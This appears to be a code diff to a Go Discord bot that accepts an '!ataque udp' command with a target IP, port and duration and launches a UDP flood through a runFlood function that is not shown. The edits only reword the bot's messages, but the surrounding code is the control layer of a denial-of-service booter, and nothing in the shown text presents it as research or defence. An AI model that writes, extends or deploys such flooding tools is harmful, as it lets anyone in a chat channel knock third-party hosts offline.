@@ -106,7 +106,7 @@ func main() {
 		if strings.HasPrefix(content, "!ataque") {
 			args := strings.Fields(content)
 			if len(args) == 1 {
-				s.ChannelMessageSend(m.ChannelID, "Uso: `!ataque udp [IP] [PUERTO] [TIEMPO]`")
+				s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
 				return
 			}
 			if len(args) == 5 && args[1] == "udp" {
@@ -114,17 +114,17 @@ func main() {
 				port, err1 := strconv.Atoi(args[3])
 				duration, err2 := strconv.Atoi(args[4])
 				if err1 != nil || err2 != nil {
-					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido.")
+					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido")
 					return
 				}
-				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque UDP enviado a %s:%d por %d segundos...", ip, port, duration))
+				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Successful Attack IP:%s:%d Time: %d ", ip, port, duration))
 				go func() {
 					runFlood(ip, port, duration)
-					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
+					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atack finish %s:%d", ip, port))
 				}()
 				return
 			}
-			s.ChannelMessageSend(m.ChannelID, "Parámetros incorrectos. Uso: `!ataque udp [IP] [PUERTO] [TIEMPO]`")
+			s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
 		}
 	})
 
@@ -133,6 +133,6 @@ func main() {
 		fmt.Println("Error al abrir la conexión:", err)
 		return
 	}
-	fmt.Println("Bot iniciado. Presiona CTRL+C para salir.")
+	fmt.Println("Bot ON¡!")
 	select {}
 }
